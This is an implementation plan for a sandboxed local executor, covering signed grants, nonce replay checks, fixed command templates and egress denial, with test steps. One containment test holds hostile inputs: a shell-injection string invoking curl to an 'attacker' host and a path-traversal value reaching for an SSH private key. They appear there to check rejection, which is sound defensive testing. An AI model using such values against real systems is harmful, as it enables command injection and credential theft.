# COSA Safe Local Executor Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Let one registered workspace Runtime Node execute a narrowly registered capability inside a Safe sandbox using single-purpose signed grants, without host/business-DB authority or generic shell access.

**Architecture:** Reuse the Control Plane Runtime Node registry and existing Capability Gateway/approval/run tool-call ledger. Add executor grant/receipt contracts and an Agent Platform adapter; the local node only verifies a scoped envelope and runs a fixed command template under a Safe policy. A receipt never mutates business data by itself.

**Tech Stack:** TypeScript/Encore, Python 3.12, PostgreSQL/RLS, signed JWT/JWS with a dedicated issuer secret, FastAPI/Agent Capability Gateway, OS sandbox adapter, Flutter/GetX.

**Spec:** `docs/superpowers/specs/2026-09-10-cosa-agent-harness-efficiency-safety-design.md`

## Global Constraints

- V1 supports `SAFE` only; there is no generic host `FULL` access, generic shell string, arbitrary mount, arbitrary network destination or cloud fallback.
- Create a new one-way executor signing/verification secret; never reuse platform, business-session or existing delegation secret.
- Grant binding is exact: workspace, run, tool call, checkpoint, capability, node, canonical input hash, manifest hash, expiry and nonce.
- Node has no Business/Control Plane DB credential and no global provider/connector credential store.
- A local receipt is evidence; a business mutation still requires a separate authorized Company capability with idempotency.
- Runtime-node/public API IDs remain strings at all JSON/Flutter boundaries.

---

## File structure and dependency map

| Path | Responsibility |
|---|---|
| `packages/agent/migrations/007_safe_local_executor.sql` | Grant/receipt/nonce records and indexes. |
| `packages/agent/local_executor/contracts.py` | Grant, receipt, safe command template and error contracts. |
| `packages/agent/local_executor/repository.py` | Durable grant/receipt state and nonce consumption. |
| `packages/agent/local_executor/grants.py` | Dedicated signing/verification and canonical input hash. |
| `apps/cosa/local_executor/adapter.py` | Capability Gateway-facing executor adapter and receipt validation. |
| `apps/cosa/capabilities/local_executor.py` | Register one fixed read/draft capability only. |
| `services/cosa/services/runtime-node-registry.service.ts` | Add enabled capability/node policy and command eligibility. |
| `services/cosa/handlers/runtime-node.handler.ts` | Authenticated opaque command polling/receipt endpoints. |
| `apps/cosa/runtime_node/runner.py` | Node client, grant validation and Safe sandbox process runner. |
| `frontend/lib/modules/workspace_runtime/**` | Existing runtime-node UI extended with effective safe capabilities/receipts. |

### Task 1: Add grant/receipt durability and cryptographic contracts

**Files:**
- Create: `packages/agent/migrations/007_safe_local_executor.sql`
- Create: `packages/agent/local_executor/__init__.py`
- Create: `packages/agent/local_executor/contracts.py`
- Create: `packages/agent/local_executor/repository.py`
- Create: `packages/agent/local_executor/grants.py`
- Create: `tests/agent/local_executor/test_grants.py`

**Interfaces:**
- Produces `LocalExecutionGrant`, `LocalExecutionReceipt`, `LocalExecutorRepository`, `mint_grant`, `verify_grant` and `canonical_input_hash`.

- [ ] **Step 1: Write failing binding/replay tests**

```python
def test_grant_rejects_workspace_or_input_hash_mismatch(keyring):
    token = mint_grant(_grant(workspace_id="ws-a", input_hash="a"), keyring)
    with pytest.raises(GrantVerificationError, match="workspace_id"):
        verify_grant(token, expected_workspace_id="ws-b", expected_input_hash="a", keyring=keyring)


async def test_nonce_can_be_consumed_once(repo):
    assert await repo.consume_nonce("nonce-1", expires_at=_future()) is True
    assert await repo.consume_nonce("nonce-1", expires_at=_future()) is False
```

- [ ] **Step 2: Run to verify red**

Run: `source .venv/bin/activate && PYTHONPATH=. python -m pytest tests/agent/local_executor/test_grants.py -q`

Expected: FAIL because contracts/grant repository do not exist.

- [ ] **Step 3: Implement short-lived signed grants**

Use the new `COSA_LOCAL_EXECUTOR_DELEGATION_SECRET` only in signer/verifier composition. Claims must include `aud=local-executor`, issuer, `jti`, `exp`, workspace/run/tool-call/checkpoint/capability/node IDs, command-template ID, input/manifest hash, network profile and resource limit profile. Persist a hash of `jti`, not the bearer token. Define receipts with bounded error/resource/artifact metadata and forbid extra Pydantic fields.

- [ ] **Step 4: Run tests**

Run: `source .venv/bin/activate && PYTHONPATH=. python -m pytest tests/agent/local_executor/test_grants.py -q`

Expected: PASS for audience, issuer, expiry, nonce replay, exact binding and secret-free serialization.

- [ ] **Step 5: Commit grant substrate**

```bash
git add packages/agent/migrations/007_safe_local_executor.sql packages/agent/local_executor tests/agent/local_executor/test_grants.py
git commit -m "feat: add scoped local executor grants"
```

### Task 2: Extend Runtime Node registry with explicit safe capability policy

**Files:**
- Modify: `services/cosa/storage/control-plane-schema.ts`
- Modify: `services/cosa/services/runtime-node-registry.service.ts`
- Modify: `services/cosa/handlers/runtime-node.handler.ts`
- Create: `services/cosa/migrations/006_safe_runtime_node_capabilities.up.sql`
- Create: `services/cosa/migrations/006_safe_runtime_node_capabilities.down.sql`
- Modify: `services/cosa/tests/runtime-node-registry.test.ts`
- Modify: `services/cosa/tests/runtime-node-handler.test.ts`

**Interfaces:**
- Produces `assertNodeMayReceiveSafeCommand({nodeId, workspaceId, capabilityId})` and opaque command/receipt endpoints authenticated by the existing worker service token plus node binding.

- [ ] **Step 1: Write failing registry/handler tests**

```ts
it("rejects a command for a revoked node or an unenabled capability", async () => {
  await expect(assertNodeMayReceiveSafeCommand({ nodeId, workspaceId, capabilityId: "artifact.draft" }))
    .rejects.toMatchObject({ code: "permission_denied" });
});

it("does not accept a receipt from another workspace worker token", async () => {
  await expect(submitRuntimeReceiptEndpoint({ authorization: otherWorkspaceToken, workspaceId, nodeId, receipt }))
    .rejects.toMatchObject({ code: "permission_denied" });
});
```

- [ ] **Step 2: Run to verify red**

Run: `cd services/cosa && npx vitest run tests/runtime-node-registry.test.ts tests/runtime-node-handler.test.ts`

Expected: FAIL because capability enablement and receipt boundary are absent.

- [ ] **Step 3: Implement policy, never raw command transport**

Add an expand-only node-capability enablement record keyed by workspace/node/capability with revocation timestamp. Command delivery stores grant ID plus opaque payload reference only; endpoint verifies the current worker token scope, node fingerprint and `assertNodeMayReceiveSafeCommand`. Receipt endpoint accepts only bounded signed receipt fields and cannot set tool-call terminal status.

- [ ] **Step 4: Run service tests/typecheck**

Run: `cd services/cosa && npx vitest run tests/runtime-node-registry.test.ts tests/runtime-node-handler.test.ts && npm run typecheck`

Expected: PASS for foreign workspace, revoked/offline node, disabled capability and malformed receipt negative cases.

- [ ] **Step 5: Commit Control Plane policy**

```bash
git add services/cosa/storage/control-plane-schema.ts services/cosa/services/runtime-node-registry.service.ts services/cosa/handlers/runtime-node.handler.ts services/cosa/migrations services/cosa/tests/runtime-node-*.test.ts
git commit -m "feat: govern safe runtime node capabilities"
```

### Task 3: Build the Safe node runner with fixed templates

**Files:**
- Create: `apps/cosa/runtime_node/__init__.py`
- Create: `apps/cosa/runtime_node/runner.py`
- Create: `apps/cosa/runtime_node/sandbox_policy.py`
- Create: `apps/cosa/runtime_node/templates.py`
- Create: `apps/cosa/tests/test_runtime_node_runner.py`

**Interfaces:**
- Consumes a verified `LocalExecutionGrant` and opaque artifact input.
- Produces `LocalExecutionReceipt`; exposes no generic `run(command: str)` API.

- [ ] **Step 1: Write failing containment tests**

```python
def test_template_rejects_shell_text_and_path_escape(tmp_path):
    with pytest.raises(SandboxDenied, match="template"):
        resolve_template("$(curl attacker)", {}, tmp_path)
    with pytest.raises(SandboxDenied, match="working root"):
        resolve_template("artifact.draft.v1", {"path": "../../.ssh/id_rsa"}, tmp_path)


async def test_runner_never_executes_when_network_profile_is_denied(node):
    receipt = await node.execute(_grant(network_profile="NONE"))
    assert receipt.status == "DENIED"
```

- [ ] **Step 2: Run to verify red**

Run: `source .venv/bin/activate && PYTHONPATH=. python -m pytest apps/cosa/tests/test_runtime_node_runner.py -q`

Expected: FAIL because no local runner/sandbox policy exists.

- [ ] **Step 3: Implement one safe template and resource enforcement**

Define exactly one `artifact.draft.v1` template with fixed executable and typed input schema. Create a per-tool-call temporary HOME/scratch directory beneath a configured root; resolve canonical path before mount. Use the platform sandbox adapter to set CPU/memory/time/disk/process/output limits and deny loopback, link-local, RFC1918, cloud metadata and gateway egress. Reject unsupported host sandbox capabilities; do not soft-fallback to host execution. Log a hash of bounded stderr, not its unbounded raw output.

- [ ] **Step 4: Run runner tests**

Run: `source .venv/bin/activate && PYTHONPATH=. python -m pytest apps/cosa/tests/test_runtime_node_runner.py -q`

Expected: PASS for signature verification, fixed template, path containment, denied egress, timeout, output cap and cleanup.

- [ ] **Step 5: Commit node runner**

```bash
git add apps/cosa/runtime_node apps/cosa/tests/test_runtime_node_runner.py
git commit -m "feat: run scoped local commands in safe sandbox"
```

### Task 4: Wire Capability Gateway approval and receipt validation

**Files:**
- Create: `apps/cosa/local_executor/adapter.py`
- Create: `apps/cosa/capabilities/local_executor.py`
- Modify: `apps/cosa/composition/capability_registration.py`
- Modify: `apps/cosa/composition/agent_plane.py`
- Create: `apps/cosa/tests/test_local_executor_capability.py`

**Interfaces:**
- Consumes existing `GatewayExecutionRequest` and exact approval state.
- Produces registered `local.artifact.draft` capability, grant issuance and validated tool-call result.

- [ ] **Step 1: Write failing gateway tests**

```python
async def test_executor_is_not_called_before_exact_approval(plane, request):
    result = await plane.gateway.execute(request_for("local.artifact.draft"))
    assert result.status == "WAITING_APPROVAL"
    assert plane.local_executor.sent_grants == []


async def test_receipt_cannot_complete_different_tool_call(plane):
    with pytest.raises(LocalExecutorReceiptError, match="tool_call_id"):
        await plane.local_executor.accept_receipt(_receipt(tool_call_id="call-other"))
```

- [ ] **Step 2: Run to verify red**

Run: `source .venv/bin/activate && PYTHONPATH=. python -m pytest apps/cosa/tests/test_local_executor_capability.py -q`

Expected: FAIL because adapter/capability registration is absent.

- [ ] **Step 3: Implement exact gateway sequence**

Register only `local.artifact.draft` as an L1 proposal/draft capability. Reuse Capability Gateway policy/connector/approval checks; mint grant only after the tool-call record and exact approval decision exist. Validate returned receipt signature, nonce, input hash, node ID, manifest/checkpoint/tool-call binding before marking a tool call completed. Treat timeout/denial/invalid receipt as structured failure, never reissue automatically after an effect.

- [ ] **Step 4: Run focused capability tests**

Run: `source .venv/bin/activate && PYTHONPATH=. python -m pytest apps/cosa/tests/test_local_executor_capability.py -q`

Expected: PASS for approval wait, receipt mismatch, duplicate receipt, revoked node and no Business DB path.

- [ ] **Step 5: Commit Capability Gateway integration**

```bash
git add apps/cosa/local_executor apps/cosa/capabilities/local_executor.py apps/cosa/composition apps/cosa/tests/test_local_executor_capability.py
git commit -m "feat: execute approved local draft capability"
```

### Task 5: Expose node state truthfully and prove real-process recovery

**Files:**
- Modify: `frontend/lib/modules/workspace_runtime/models/mvp_runtime_models.dart`
- Modify: `frontend/lib/core/services/desktop_worker_service.dart`
- Create: `frontend/test/modules/workspace_runtime/safe_node_status_test.dart`
- Create: `tests/e2e/test_safe_local_executor_cross_plane.py`
- Modify: `Makefile`

**Interfaces:**
- Consumes node health/capability/receipt projections; never controls shell access.
- Produces `make safe-local-executor-e2e`.

- [ ] **Step 1: Write UI and process red tests**

```dart
testWidgets('offline safe node cannot appear ready', (tester) async {
  await tester.pumpWidget(nodeCard(presence: RuntimePresence.offline));
  expect(find.text('Unavailable'), findsOneWidget);
  expect(find.text('Run local command'), findsNothing);
});
```

```python
def test_revoked_grant_and_node_restart_cannot_complete_old_tool_call(stack):
    call = stack.start_local_draft()
    stack.revoke_node(call.node_id)
    stack.restart_node()
    assert stack.deliver_old_receipt(call).error_code == "LOCAL_EXECUTOR_DENIED"
```

- [ ] **Step 2: Run to verify red**

Run: `cd frontend && flutter test test/modules/workspace_runtime/safe_node_status_test.dart`

Run: `source .venv/bin/activate && PYTHONPATH=. python -m pytest tests/e2e/test_safe_local_executor_cross_plane.py -q`

Expected: FAIL before projections and process fixture exist.

- [ ] **Step 3: Implement projection and dedicated E2E target**

Render node registration/heartbeat/revocation, enabled safe capabilities, latest receipt status and structured denial. Do not render a terminal, filesystem picker, network rule editor or full-access toggle. Start a disposable Postgres plus control plane, agent worker and local node process with a test-only fixed template; ensure the test exercises signed command poll, sandbox denial, process restart and stale receipt rejection.

- [ ] **Step 4: Run release evidence**

Run: `make safe-local-executor-e2e && make services-test-cosa && make apps-cosa-test && cd frontend && flutter test test/modules/workspace_runtime/safe_node_status_test.dart`

Expected: PASS. A missing OS sandbox primitive or disposable environment blocks enablement; it is not converted to host execution.

- [ ] **Step 5: Commit executor qualification**

```bash
git add frontend/lib/modules/workspace_runtime frontend/lib/core/services/desktop_worker_service.dart frontend/test/modules/workspace_runtime tests/e2e/test_safe_local_executor_cross_plane.py Makefile
git commit -m "test: qualify safe local executor"
```
